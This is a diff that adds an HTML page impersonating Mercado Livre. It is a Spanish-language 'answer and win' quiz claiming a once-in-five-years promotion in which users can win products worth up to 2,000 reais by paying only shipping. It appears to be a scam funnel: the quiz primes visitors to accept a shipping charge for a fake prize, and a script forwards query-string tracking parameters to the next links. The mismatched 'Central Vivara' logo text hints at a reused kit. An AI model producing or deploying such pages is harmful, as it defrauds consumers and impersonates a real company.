@@ -1,0 +1,186 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="/roletac/quiz/css/stylescf14.css">
+    <link rel="stylesheet" href="/roletac/quiz/css/fonts.css">
+
+    <link rel="icon" href="images/favico.jpg" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/favico.jpg">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
+    <title>Mercado Livre</title>
+
+    <script>
+        function onLoad() {
+            var links = document.getElementsByTagName("a");
+
+            for (var i = 0, n = links.length; i < n; i++) {
+            if (links[i].href.includes("#")) {
+                continue;
+            }
+
+            var href =
+                links[i].href.trim() +
+                (links[i].href.indexOf("?") > 0 ? "&" : "?") +
+                document.location.search.replace("?", "").toString();
+            links[i].href = href;
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", onLoad);
+    </script>
+
+</head>
+<body>
+
+
+
+
+    <nav class="navbar" style="padding-top: 15px; margin-bottom: 5px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+            <img src="images/logoespanhol.png" style="height: 10vh;" alt="Logo Central Vivara">
+        </div>
+
+        <div class="logo-central">
+        </div>
+
+        <div class="menu-icon" style="padding-right: 3%;">
+            <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black">menu</span>
+        </div>
+    </nav>
+    
+
+    <div class="pergunta"> 
+
+        <!--------------------- Barra de progresso --------------------->
+
+        <div style="padding-bottom: 20px;"></div>
+
+        <div class="respondaeganhe">
+            <p style="font-family: 'GellixSemiBold';">Responde y gana!</p>
+        </div>
+
+        <div class="container" style="padding-bottom: 5px;">
+            <div class="progress-bar-container">
+                <div class="progress-bar">
+                    <div class="progress" id="progress"></div>
+                </div>
+                <div class="progress-text" id="progress-text">20%</div>
+            </div>
+        </div>
+
+
+        <!--------------------- Pergunta 1 --------------------->
+
+        <div id="p1">
+
+            <img src="images/11.png" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+
+            <p class="pergunta_title"> ¿Qué es lo que más valoras cuando compras en Mercado Livre? </p>
+
+            <ul class="quiz-options">
+                <li><button>Variedad de productos</button></li>
+                <li><button>Precios competitivos</button></li>
+                <li><button>Servicio al cliente</button></li>
+                <li><button>Facilidad de pago</button></li>
+            </ul>
+
+        </div>
+
+        <!--------------------- Pergunta 2 --------------------->
+
+        <div id="p2" style="display: none">
+            <img src="images/12.png" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+            <p class="pergunta_title"> ¿Ya conocías esta promoción de Mercado Livre? ¡Ocurre cada 5 años de la empresa! </p>
+            <ul class="quiz-options">
+                <li><button>¡Sí, estoy muy emocionado!</button></li>
+                <li><button>Sí, pero nunca participé.</button></li>
+                <li><button>¡No, pero me encantó la idea!</button></li>
+                <li><button>No, nunca lo supe.</button></li>
+            </ul>
+        </div>
+
+        <!--------------------- Pergunta 3 --------------------->
+
+        <div id="p3" style="display: none">
+            <img src="images/7.png" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+            <p class="pergunta_title">¿Qué se siente al tener la posibilidad de ganar productos por valor de hasta 2 mil reales, pagando sólo el envío?</p>
+            <ul class="quiz-options">
+                <li><button>Extremadamente feliz</button></li>
+                <li><button>Muy emocionado</button></li>
+                <li><button>Sorprendido y emocionado</button></li>
+                <li><button>Curiosidad por saber más</button></li>
+            </ul>
+        </div>
+
+        <!--------------------- Pergunta 4 --------------------->
+
+        <div id="p4" style="display: none">
+            <img src="images/4.png" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+            <p class="pergunta_title"> ¿Es usted un cliente fiel de Mercado Livre? En caso afirmativo, ¿cuánto tiempo ha pasado? </p>
+            <ul class="quiz-options">
+                <li><button>Sí, hace más de 5 años</button></li>
+                <li><button>Sí, entre 1 y 5 años</button></li>
+                <li><button>Sí, hace menos de 1 año</button></li>
+                <li><button>No, soy un cliente nuevo</button></li>
+            </ul>
+        </div>
+
+        <!--------------------- Pergunta 5 --------------------->
+
+        <div id="p5" style="display: none">
+            <img src="images/mercadolibre_cover.jpg" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+            <p class="pergunta_title"> ¿Entiendes que necesitamos cobrar el envío para beneficiar a la mayor cantidad de clientes posible? </p>
+            <ul class="quiz-options">
+                <li><button>  Estoy de acuerdo, ayuda a más personas!  </button></li>
+                <li><button>¡Entiendo, ya están dando mucho!</button></li>
+                <li><button>¡Soy egoísta, lo quiero gratis!</button></li>
+                <li><button>¡Sí, llegará más rápido!</button></li>
+            </ul>
+        </div>
+
+
+
+
+
+        <!--------------------- Botão de seguir --------------------->
+    
+        <div class="question-container">
+                <div class="question" id="question1" style="display:none;"></div>
+                <div class="question" id="question2" style="display:none;"></div>
+                <div class="question" id="question3" style="display:none;"></div>
+                <div class="question" id="question4" style="display:none;"></div>
+                <div class="question" id="question5" style="display:none;"></div>
+        </div>
+
+        <div style="padding-bottom: 10px;"></div>
+    
+        <button class="next-button" id="next-button" onclick="nextQuestion()">Próximo</button>
+        
+        <div style="padding-bottom: 20px;"></div>
+
+        
+    </div>
+
+    
+
+
+    <script src="js/scripts.js"></script>
+
+
+
+
+    <script>
+        document.querySelectorAll('.quiz-options button').forEach(button => {
+            button.addEventListener('click', () => {
+                document.querySelectorAll('.quiz-options button').forEach(btn => btn.style.borderColor = '#ccc');
+                button.style.borderColor = '#ffc105';
+                button.style.backgroundColor = '#ffeaac';
+            });
+        });
+    </script>
+
+
+
+
+</body></html>
